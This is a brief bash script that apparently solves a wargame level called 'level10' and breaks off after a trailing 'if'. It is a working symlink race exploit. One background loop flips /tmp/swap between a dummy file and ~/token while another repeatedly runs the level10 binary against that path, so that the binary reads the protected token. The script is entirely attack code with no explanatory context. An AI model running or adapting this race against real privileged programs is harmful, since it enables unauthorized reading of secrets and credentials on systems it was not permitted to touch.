#!/bin/bash

touch /tmp/swap

while true; do
    ln -sf /tmp/dummy /tmp/swap
    ln -sf ~/token /tmp/swap
done &

# Keep trying to run the level10 binary
while true; do
    ./level10 /tmp/swap 127.0.0.1
done &

if 